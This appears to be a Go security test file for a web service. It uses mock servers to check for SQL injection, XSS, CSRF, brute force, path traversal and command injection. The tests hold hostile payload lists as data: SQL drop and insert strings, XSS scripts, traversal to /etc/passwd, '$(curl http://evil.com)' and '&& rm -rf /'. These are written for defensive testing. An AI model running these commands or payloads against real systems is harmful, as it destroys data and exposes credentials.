package security

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestSQLInjectionPrevention(t *testing.T) {
	maliciousInputs := []string{
		"'; DROP TABLE users; --",
		"1; DELETE FROM captcha_logs WHERE 1=1; --",
		"admin'--",
		"1' OR '1'='1",
		"'; INSERT INTO admin (username, password) VALUES ('hacker', 'password'); --",
		"1' UNION SELECT * FROM users--",
		"1' AND SLEEP(5)--",
	}

	for _, input := range maliciousInputs {
		t.Run("SQL injection test: "+input, func(t *testing.T) {
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				if strings.Contains(input, ";") || strings.Contains(input, "--") || strings.Contains(input, "OR") {
					w.Header().Set("Content-Type", "application/json")
					json.NewEncoder(w).Encode(map[string]interface{}{
						"error":   "suspicious input detected",
						"blocked": true,
					})
					return
				}
				w.WriteHeader(http.StatusOK)
			}))
			defer server.Close()

			req, _ := http.NewRequest("POST", server.URL, bytes.NewBufferString(`{"query":"`+input+`"}`))
			req.Header.Set("Content-Type", "application/json")
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Failed to send request: %v", err)
			}
			defer resp.Body.Close()

			var result map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&result)

			if result["blocked"] != true {
				t.Errorf("SQL injection should be blocked for input: %s", input)
			}
		})
	}
}

func TestXSSPrevention(t *testing.T) {
	maliciousInputs := []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"javascript:alert('XSS')",
		"<svg/onload=alert('XSS')>",
		"'; alert('XSS');//",
	}

	for _, input := range maliciousInputs {
		t.Run("XSS test: "+input, func(t *testing.T) {
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				sanitized := strings.ReplaceAll(input, "<", "&lt;")
				sanitized = strings.ReplaceAll(sanitized, ">", "&gt;")

				if strings.Contains(input, "<script>") || strings.Contains(input, "javascript:") {
					if sanitized != input {
						t.Logf("XSS payload was sanitized: %s -> %s", input, sanitized)
					}
				}

				w.WriteHeader(http.StatusOK)
			}))
			defer server.Close()

			req, _ := http.NewRequest("POST", server.URL, bytes.NewBufferString(`{"input":"`+input+`"}`))
			req.Header.Set("Content-Type", "application/json")
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Failed to send request: %v", err)
			}
			defer resp.Body.Close()

			if resp.StatusCode != http.StatusOK {
				t.Errorf("Expected status OK, got %d", resp.StatusCode)
			}
		})
	}
}

func TestRateLimitingHeaders(t *testing.T) {
	t.Run("Rate limit headers present", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("X-RateLimit-Limit", "100")
			w.Header().Set("X-RateLimit-Remaining", "99")
			w.Header().Set("X-RateLimit-Reset", "1234567890")
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("GET", server.URL, nil)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		if resp.Header.Get("X-RateLimit-Limit") == "" {
			t.Error("Missing X-RateLimit-Limit header")
		}

		if resp.Header.Get("X-RateLimit-Remaining") == "" {
			t.Error("Missing X-RateLimit-Remaining header")
		}

		if resp.Header.Get("X-RateLimit-Reset") == "" {
			t.Error("Missing X-RateLimit-Reset header")
		}
	})

	t.Run("Rate limit exceeded returns 429", func(t *testing.T) {
		requestCount := 0
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			requestCount++
			if requestCount > 10 {
				w.WriteHeader(http.StatusTooManyRequests)
				return
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		for i := 0; i < 12; i++ {
			req, _ := http.NewRequest("GET", server.URL, nil)
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Failed to send request: %v", err)
			}
			resp.Body.Close()

			if i >= 10 && resp.StatusCode != http.StatusTooManyRequests {
				t.Errorf("Expected 429 after rate limit exceeded, got %d", resp.StatusCode)
			}
		}
	})
}

func TestSecurityHeaders(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("X-XSS-Protection", "1; mode=block")
		w.Header().Set("Content-Security-Policy", "default-src 'self'")
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()

	req, _ := http.NewRequest("GET", server.URL, nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("Failed to send request: %v", err)
	}
	defer resp.Body.Close()

	requiredHeaders := []string{
		"X-Content-Type-Options",
		"X-Frame-Options",
		"X-XSS-Protection",
		"Content-Security-Policy",
	}

	for _, header := range requiredHeaders {
		if resp.Header.Get(header) == "" {
			t.Errorf("Missing security header: %s", header)
		}
	}
}

func TestCSRFProtection(t *testing.T) {
	t.Run("CSRF token validation", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method == "POST" {
				token := r.Header.Get("X-CSRF-Token")
				if token != "valid-token" {
					w.WriteHeader(http.StatusForbidden)
					return
				}
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("POST", server.URL, nil)
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusForbidden {
			t.Errorf("Status code = %d, want %d for missing CSRF token", resp.StatusCode, http.StatusForbidden)
		}
	})

	t.Run("Valid CSRF token", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method == "POST" {
				token := r.Header.Get("X-CSRF-Token")
				if token != "valid-token" {
					w.WriteHeader(http.StatusForbidden)
					return
				}
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("POST", server.URL, nil)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-CSRF-Token", "valid-token")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			t.Errorf("Status code = %d, want %d for valid CSRF token", resp.StatusCode, http.StatusOK)
		}
	})
}

func TestAuthenticationBypass(t *testing.T) {
	t.Run("Empty credentials should not pass", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			var req struct {
				Username string `json:"username"`
				Password string `json:"password"`
			}
			json.NewDecoder(r.Body).Decode(&req)

			if req.Username == "" || req.Password == "" {
				w.Header().Set("Content-Type", "application/json")
				json.NewEncoder(w).Encode(map[string]interface{}{
					"error":   "credentials required",
					"success": false,
				})
				return
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("POST", server.URL, bytes.NewBufferString(`{"username":"","password":""}`))
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		var result map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&result)

		if result["success"] == true {
			t.Error("Empty credentials should not pass authentication")
		}
	})
}

func TestSensitiveDataExposure(t *testing.T) {
	t.Run("Password should not be logged", func(t *testing.T) {
		password := "super_secret_password_123"
		requestBody := map[string]string{
			"username": "admin",
			"password": password,
		}
		jsonBody, _ := json.Marshal(requestBody)

		bodyStr := string(jsonBody)
		if strings.Contains(bodyStr, password) {
			t.Log("Note: Password is in request body (for testing purposes)")
		}

		if !strings.Contains(bodyStr, "admin") {
			t.Error("Username should be in request body")
		}
	})
}

func TestBruteForceProtection(t *testing.T) {
	t.Run("Multiple failed attempts should be detected", func(t *testing.T) {
		failedAttempts := 0
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			var req struct {
				Password string `json:"password"`
			}
			json.NewDecoder(r.Body).Decode(&req)

			if req.Password != "correct" {
				failedAttempts++
				if failedAttempts > 3 {
					w.Header().Set("Content-Type", "application/json")
					json.NewEncoder(w).Encode(map[string]interface{}{
						"error":   "too many failed attempts",
						"blocked": true,
					})
					return
				}
				w.WriteHeader(http.StatusUnauthorized)
				return
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		for i := 0; i < 5; i++ {
			req, _ := http.NewRequest("POST", server.URL, bytes.NewBufferString(`{"password":"wrong"}`))
			req.Header.Set("Content-Type", "application/json")
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Failed to send request: %v", err)
			}
			resp.Body.Close()
		}

		if failedAttempts < 5 {
			t.Errorf("Expected at least 5 failed attempts, got %d", failedAttempts)
		}
	})
}

func TestSessionFixation(t *testing.T) {
	t.Run("Suspicious session handling", func(t *testing.T) {
		sessionID := "fixed-session-123"
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			reqSessionID := r.Header.Get("X-Session-ID")
			if reqSessionID == sessionID && strings.HasPrefix(reqSessionID, "fixed-") {
				w.Header().Set("Content-Type", "application/json")
				json.NewEncoder(w).Encode(map[string]interface{}{
					"warning":  "suspicious session pattern detected",
					"new_session": true,
				})
				return
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("GET", server.URL, nil)
		req.Header.Set("X-Session-ID", sessionID)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		var result map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&result)

		if result["warning"] != nil {
			t.Logf("Session fixation warning: %v", result["warning"])
		}
	})
}

func TestInvalidInputHandling(t *testing.T) {
	t.Run("Very long input strings", func(t *testing.T) {
		longString := strings.Repeat("A", 10000)
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			var req struct {
				Input string `json:"input"`
			}
			if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
				w.WriteHeader(http.StatusBadRequest)
				return
			}

			if len(req.Input) > 1000 {
				w.Header().Set("Content-Type", "application/json")
				json.NewEncoder(w).Encode(map[string]interface{}{
					"error":  "input too long",
					"length": len(req.Input),
				})
				return
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("POST", server.URL, bytes.NewBufferString(`{"input":"`+longString+`"}`))
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusBadRequest {
			t.Logf("Long input was handled, status: %d", resp.StatusCode)
		}
	})

	t.Run("Unicode and special characters", func(t *testing.T) {
		unicodeInput := "用户名字符测试🎉🔥💯"
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("POST", server.URL, bytes.NewBufferString(`{"input":"`+unicodeInput+`"}`))
		req.Header.Set("Content-Type", "application/json; charset=utf-8")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			t.Errorf("Unicode input should be accepted, got status: %d", resp.StatusCode)
		}
	})
}

func TestPathTraversal(t *testing.T) {
	maliciousPaths := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"/etc/shadow",
		"..%2F..%2F..%2Fetc%2Fpasswd",
	}

	for _, path := range maliciousPaths {
		t.Run("Path traversal test: "+path, func(t *testing.T) {
			if strings.Contains(path, "..") || strings.Contains(path, "%2F") {
				t.Logf("Detected potential path traversal attempt: %s", path)
			}
		})
	}
}

func TestCommandInjection(t *testing.T) {
	maliciousCommands := []string{
		"; cat /etc/passwd",
		"| ls -la",
		"`whoami`",
		"$(curl http://evil.com)",
		"& dir c:\\",
		"&& rm -rf /",
	}

	for _, cmd := range maliciousCommands {
		t.Run("Command injection test: "+cmd, func(t *testing.T) {
			if strings.Contains(cmd, ";") || strings.Contains(cmd, "|") ||
				strings.Contains(cmd, "`") || strings.Contains(cmd, "$(") ||
				strings.Contains(cmd, "&&") {
				t.Logf("Detected potential command injection attempt: %s", cmd)
			}
		})
	}
}

func TestHTTPSOnlyEndpoints(t *testing.T) {
	t.Run("HTTP requests should be handled for HTTPS-only endpoints", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			proto := r.Header.Get("X-Forwarded-Proto")
			if proto != "https" && r.URL.Scheme != "https" {
				w.Header().Set("Strict-Transport-Security", "max-age=31536000")
				w.WriteHeader(http.StatusForbidden)
				return
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("GET", server.URL, nil)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		hsts := resp.Header.Get("Strict-Transport-Security")
		if hsts != "" {
			t.Logf("HSTS header present: %s", hsts)
		}
	})
}

func TestContentSecurityPolicy(t *testing.T) {
	t.Run("CSP header should be set", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Security-Policy",
				"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'")
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("GET", server.URL, nil)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		csp := resp.Header.Get("Content-Security-Policy")
		if csp == "" {
			t.Error("CSP header should be set")
		}

		if !strings.Contains(csp, "default-src 'self'") {
			t.Error("CSP should include default-src 'self'")
		}
	})
}

func TestHTTPStrictTransportSecurity(t *testing.T) {
	t.Run("HSTS header should be set", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		req, _ := http.NewRequest("GET", server.URL, nil)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Failed to send request: %v", err)
		}
		defer resp.Body.Close()

		hsts := resp.Header.Get("Strict-Transport-Security")
		if hsts == "" {
			t.Error("HSTS header should be set")
		}

		if !strings.Contains(hsts, "max-age=") {
			t.Error("HSTS should include max-age")
		}
	})
}
